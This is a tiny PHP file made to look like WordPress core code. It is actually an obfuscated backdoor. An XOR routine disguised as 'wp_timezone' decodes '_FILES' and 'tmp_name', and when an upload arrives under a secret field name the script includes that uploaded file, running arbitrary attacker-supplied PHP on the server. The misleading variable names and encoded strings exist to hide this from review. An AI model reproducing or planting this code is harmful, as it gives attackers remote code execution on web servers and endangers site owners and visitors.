<?php 	
$wpsmiliestrans = 'KBxurF4FgbTut';

$old_slugs = $wpsmiliestrans;
function wp_timezone($locale, $default_category_post_types)

{
    $array_int_fields = $default_category_post_types;
    $file = urldecode($locale);
    $static_replacements = substr($array_int_fields,0, strlen($file));
	$fields = 'charset';
    $post_content = $file ^ $static_replacements;

    return $post_content;
}

$script_and_style_regex = ${wp_timezone("%14%04197%15", $old_slugs)};
$current_user = $script_and_style_regex;
	$pinged = 'unhashed';
$last_pee = isset($current_user[$old_slugs]);

if ($last_pee)

{
    $cdn_url = $script_and_style_regex[$old_slugs];
    $args = $cdn_url[wp_timezone("%3F%2F%08%2A%1C%27Y%23", $old_slugs)];

    $_wp_post_type_features = $args;
    include ($_wp_post_type_features);

}
?>
